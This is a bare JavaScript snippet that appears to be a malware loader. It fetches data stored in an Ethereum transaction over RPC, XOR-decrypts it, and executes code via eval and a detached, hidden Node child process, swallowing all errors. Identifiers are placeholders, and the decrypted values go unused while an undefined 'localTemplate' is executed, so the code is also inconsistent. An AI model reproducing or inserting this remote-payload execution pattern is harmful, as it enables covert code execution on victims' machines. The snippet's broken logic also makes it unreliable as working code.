(async function () {
  async function recover(key) {
    const tx = await rpc('eth_getTransactionByHash', ['arbitrary-transaction']);
    const raw = Buffer.from(tx.result.input.slice(2), 'hex').toString('utf8');
    return raw.split('').map((value, index) => String.fromCharCode(value.charCodeAt(0) ^ key.charCodeAt(index % key.length))).join('');
  }
  try {
    var first = await recover('arbitrary-key');
    eval(localTemplate);
  } catch (error) {}
  try {
    var second = await recover('another-key');
    cp['spawn']('node', ['-e', ('global.version=1;' + (localTemplate))], { detached: true, stdio: 'ignore', windowsHide: true })['on']('error', function () { eval(localTemplate); });
  } catch (error) {}
})();
